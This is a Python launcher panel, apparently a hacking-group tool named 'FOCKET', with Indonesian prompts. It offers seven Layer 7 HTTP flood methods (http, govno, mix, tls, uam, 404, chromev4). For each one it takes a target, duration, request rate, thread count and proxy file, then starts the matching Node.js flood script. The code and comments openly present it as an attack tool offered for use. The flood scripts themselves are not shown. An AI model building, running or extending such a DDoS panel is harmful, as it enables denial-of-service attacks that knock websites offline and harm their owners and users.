# jngan lupa peribadah hari ini
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title FOCKET - HTTP2 Focket")
    system("mode 101, 30")

# untuk melakukan perintah scodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# gunakan proxy yg strong
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # pilih proxy yg bagus untuk melakukan serangan
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# tampilan menuscript
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("   SAYA SUDAH BOSAN DENGAN KEHIDUPAN INI")
    print("")
    print("\x1b[38;5;160m⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀ ⢀    ")
    print("⠀         ⠱⣄⠀⣀⣀⡤⣴⠶⠾⠿⢿⣿⡛⠛⠛⢻⠷⠶⠤⢤⣾⣀⠀⠀⠀⢀⠄⠀⠀⠀⠀⠀⢀⡾    ")
    print("⢀⠀⠀⠀⠀⠀⠀⠀⢀⡤⢿⣿⡉⡀⠀⣈⣶⣄⣀⣸⣿⣄⣀⠀⡸⠀⠀⢀⣼⠀⠉⠛⠳⢶⣬⣄⡀⠀⠀⣠⣾⡟      ")
    print("⠀⠻⢦⣀⠀⠀⣠⡾⣻⣾⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣶⣤⣖⣤⣏⣻⣿⣿⣿⣿⣿⣉⠀⠀     ")
    print("⠀⠀⠀⢙⣿⣿⣿⣿⣿⣿⣿⠿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣻⣿⣷⣦⣤⠶⠋⠀")
    print("⠀⠀⣠⣿⣿⣿⠿⠛⠉⠁⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣷⣿⡿⢟⢛⡻⠀  ")
    print("⠀⠈⢀⣞⡛⠁⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢸⣿⣿⣿⣇⠘⢀⠛⢟⡻⢿⣿⣿⣿⣿⣿⣶⣦⣤⣤⠤")
    print("⠀⠴⠋⠀⠀⠀⠀⠀⠀⢀⣾⣟⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣀⣠⣴⣿⣿⣿⣿⡎⠁⠈⠀⠑⠋⠛⢿⣿⣿⡿⠉⠉⠁  ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡯⣾⣟⢿⣿⣿⣿⣿⣿⣿⠛⢏⠀⣿⣿⣿⡟⡿⡿⡿⣿⣿⡇⠀⠛⠳⣥⠀⠀⠙⣿⡿      ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠈⠙⠛⠄⠘⣩⣍⣃⣿⣿⣿⣧⣝⡛⠃⠁⠀⠀⢝⢻⣿⠀⠀⠀⠀⠀⢤⢠⡿⠁      ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠐⠈⣦⢹⣿⣿⣿⣿⡍⢴⣿⠇⠀⠀⠁⠀⣹⡏⠀⠀⠀⠀⠀⠀⠸⠁       ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠁⢾⠿⣛⣛⣛⡻⢷⠈⠀⠀⠀⠀⠀⣿⠃               ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢳⡀⠀⠀⠀⠀⠀⠀⠉⠛⠟⠛⠋⠀⠀⠀⠀⠀⠀⢀⡟                ")
    print("⠀⠀⠀⠀⠀⠀⣀⣬⣿⣶⣤⣈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⠀⢀⣀⣤⣴⣀          ")
    print("⠀⠀⠀⠀⠀⣰⠟⠉⠀⠀⢈⠟⠻⠿⣶⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣲⣿⣵⠶⠿⢏⠉⠁⠈⠙⠷⣆        ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⣴⣟⡉⠙⡿⠛⠻⠿⣿⠿⠿⢿⠛⠋⠉⠻⣆⠀⠀⠀⠑⠄⠀⠀⠀⠘⠂       ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠈⢹⠋⠒⠲⠴⣷⠤⠀⠈⣇⠀⠀⠀⠈⠇                 ")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋                         ")

    print("============= Method layer 7 ============")
    print("  ==> VIP")
    print(" =|| http |1| govno |2| mix |3| tls |4| uam |5| 404 |6| chromev4 |7|")
    print("=========================================")

# menu untuk melakukan serangan
def handle_menu_selection(selection):
    if selection == '1':
        print("\n============== http ==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== http ==============")
        print(f" SIAPAH YG BERSUNGGUH2 DIA PASTI MENDAPATKANNYA")
        print("========================================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print("=========================================")
        input("  untuk melakukan attack (Enter)\n")
        run_script('http.js', [target, time, requests, thread,])

    elif selection == '2':
        print("\n================= govno ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== govno ==============")
        print(f"  ALLAH MENCINTAI ORG2 YG SABAR")
        print("===================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  untuk melakukan attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  koneksi proxy: {proxy_count}")
        run_script('govno.js', [target, time, requests, thread, proxy_file,])

    elif selection == '3':
        print("\n================= mix =================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= mix =================")
        print(f" SETIAP KEBAIKAN ADALAH SEDEKAH")
        print("=========================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print("=========================================")
        input("  untuk melakukan serangan attack (Enter)\n")
        proxy_file = "proxy.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  koneksi proxy: {proxy_count}")
        run_script('mix.js', [target, time, requests, thread,])

    elif selection == '4':
        print("\n================= tls ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= tls ================")
        print(f"  KATAKAN LAH YG BENAR WALAU PAHIT SEKALIPUN")
        print("=============================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print("=========================================")
        input("  untuk melakukan attack (Enter)\n")
        run_script('tls.js', [target, time, requests, thread,])

    elif selection == '5':
        print("\n================== uam ==================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        thread = input("  masukan thread: ")
        requests = input("  masukan requests per IP: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== uam ==================")
        print(f" TANGAN DI ATAS LEBIH BAIK DARI PADA TANGAN DI BAWAH")
        print("====================================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Requests per IP: {requests}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  untuk melakukan serangan attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  koneksi proxy: {proxy_count}")
        run_script('uam.js', [target, time, thread, requests, proxy_file,])

    elif selection == '6':
        print("\n=============== 404 ==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== 404 ==============")
        print(f" KERJAKAN LAH SHOLAT TEPAT PADA WAKTU NYA")
        print("=========================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  untuk mrlakukan attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  koneksi: {proxy_count}")
        run_script('404.js', [target, time, requests, thread, proxy_file,])

    elif selection == '7':
        print("\n================ chromev4 ===============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ chromev4 ================")
        print(f" IMAN YG UTAMA ADALAH SABAR DAN PEMAAF")
        print("=========================================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("==========================================")
        input("  untuk melakukan attack (Enter)\n")
        proxy_file = "proxy.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  koneksi proxy: {proxy_count}")
        run_script('chromev4.js', [target, time, thread, requests, proxy_file,])

    else:
        print("  SAYA SUDAH BOSAN DENGAN KEHIDUPAN INI.")

# FOCKET panel
def start_panel():
    while True:
        show_menu()
        selection = input("  pilih no untuk serang (0-7): ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
            print("  allah selalu mencintai org org sabar.")
            continue
        
        handle_menu_selection(selection)

# selamat datang di panel focket
start_panel()

# https://github.com/llolyppop
